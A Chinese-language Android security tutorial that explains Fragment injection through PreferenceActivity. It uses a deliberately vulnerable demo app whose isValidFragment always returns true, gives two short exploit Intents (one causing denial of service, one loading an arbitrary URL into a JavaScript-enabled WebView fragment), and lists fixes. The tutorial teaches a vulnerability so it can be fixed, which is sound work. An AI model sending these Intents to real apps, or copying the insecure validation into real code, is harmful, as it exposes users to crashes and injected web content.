1. Fragment 基本介绍 


Fragment 是 Android3.0 后引入的一个新的 API，它出现的初衷是为了适应大屏幕的平板电脑，现在也被普遍应用于手机应用开发中。


其意为碎片，用来组建Activity界面的局部模块, 也可以说一个 Actiivty 界面可以由多个 Fragment 组成。其行为与 Activity 很相似, 有自己对应的 View, 它有自己的生命周期，接收自己的输入事件。一个 Fragment 必须总是嵌入在一个 Activity 中，同时 Fragment 的生命周期受 Activity 的影响。

    3.2 Fragment 注入


  • 漏洞原理


安卓开发者可以通过继承 android.preference.PreferenceActivity 的方式来实现一个自己的设置页面。


PreferenceActivity 会接收两个 intent 参数：

PreferenceActivity.EXTRA_SHOW_FRAGMENT(:android:show_fragment) 和PreferenceActivity.EXTRA_SHOW_FRAGMENT_ARGUMENTS(:android:show_fragment_arguments)。

第一个参数指定了要加载的 Fragment 的类名，第二个参数包含了需传递给 Fragment 的 bundle 信息。


以下是 PreferenceActivity 的 onCreate 方法：(API 27)


@Override 
protected void onCreate(@Nullable Bundle savedInstanceState){ 
    super.onCreate(savedInstanceState); 
    ......
    String initialFragment = getIntent().getStringExtra(EXTRA_SHOW_FRAGMENT); 
    Bundle initialArguments = getIntent().getBundleExtra(EXTRA_SHOW_FRAGMENT_ARGUMENTS);
    ......
    switchToHeader(initialFragment, initialArguments);
    ......
}

继续查看 switchToHeader 代码，会调用 switchToHeaderInner 方法：


private void switchToHeaderInner(String fragmentName, Bundle args) { 
    getFragmentManager().popBackStack(BACK_STACK_PREFS, FragmentManager.POP_BACK_STACK_INCLUSIVE); 
    if (!isValidFragment(fragmentName)) { 
        throw new IllegalArgumentException("Invalid fragment for this activity: " + fragmentName); 
    } 
    Fragment f = Fragment.instantiate(this, fragmentName, args); 
......
}

其首先验证了要加载的类是否为合法的 Fragment，如果不是的话就会抛出异常。然后通过 Fragment 的 instantiate 方法去加载 Fragment。


public static Fragment instantiate(Context context, String fname, @Nullable Bundle args) { 
    try { 
        Class<?> clazz = sClassMap.get(fname); 
        if (clazz == null) { 
            // Class not found in the cache, see if it's real, and try to add it 
            clazz = context.getClassLoader().loadClass(fname); 
            if (!Fragment.class.isAssignableFrom(clazz)) { 
                throw new InstantiationException("Trying to instantiate a class " + fname + " that is not a Fragment", new ClassCastException()); 
            } 
            sClassMap.put(fname, clazz); 
        } 
        Fragment f = (Fragment) clazz.getConstructor().newInstance(); 
        ......
        
}

在 instantiate 方法中，首先会判断加载的类是否为 Fragment 的子类，如果不是就抛出异常。之后会通过反射的方式加载类的构造方法。


经过上面的分析，存在两类安全问题：一是拒绝服务，二是可以加载任意的 Fragment。


  • 漏洞分析



在 vuls 应用中有以下的 Activity 继承自PreferenceActivity。


<activity 
    android:name=".activities.Activity.FragmentActivity"
    android:exported="true" 
    android:label="Fragement 安全" />

public class FragmentActivity extends PreferenceActivity { 
    @Override 
    protected void onCreate(Bundle savedInstanceState) { 
        super.onCreate(savedInstanceState); 
    } 
    @Override 
    protected boolean isValidFragment(String fragmentName) { 
        Log.e("FragmentVuls", "fragmentName: " + fragmentName); 
        return true; 
    } 
}

可见，此 Activity 是暴露的，那么就会存在 Fragment 注入漏洞。

在 vuls 中有以下的 Fragment，可以加载指定的网页


public class TargetFragment extends Fragment { 
    public TargetFragment() { 
        Log.e("DDNS: ", "TargetFragment's constructor"); 
    } 
    
    @Override 
    public void onCreate(Bundle savedInstanceState) { 
        super.onCreate(savedInstanceState); 
    }
    
    @Override 
    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) { 
        View view = inflater.inflate(R.layout.fragment_target,null); 
        WebView webview = (WebView) view.findViewById(R.id.webview_fragment); 
        webview.getSettings().setJavaScriptEnabled(true); 
        webview.loadUrl(getActivity().getIntent().getDataString()); 
        return view; 
    } 
}

  • 漏洞利用


  • 拒绝服务：

Intent i = new Intent(); 
i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK); 
i.setClassName("ddns.android.vuls","ddns.android.vuls.activities.Activity.FragmentActivity"); 
i.putExtra(":android:show_fragment","xxx"); 
startActivity(i);


  • 加载任意 Fragment：

Intent i = new Intent(); 
i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK); 
i.setClassName("ddns.android.vuls","ddns.android.vuls.activities.Activity.FragmentActivity"); 
i.putExtra(":android:show_fragment","ddns.android.vuls.activities.Activity.TargetFragment"); 
i.setData(Uri.parse("https://www.baidu.com")); 
startActivity(i);


  • 漏洞修复



1、对于不需要导出的 Activity，设置为非导出。

2、在 isValidFragment 方法中判断要加载的 Fragment 名称，而不是一直返回 true。

3、针对拒绝服务，重写 onCreate 方法，在其中处理异常。
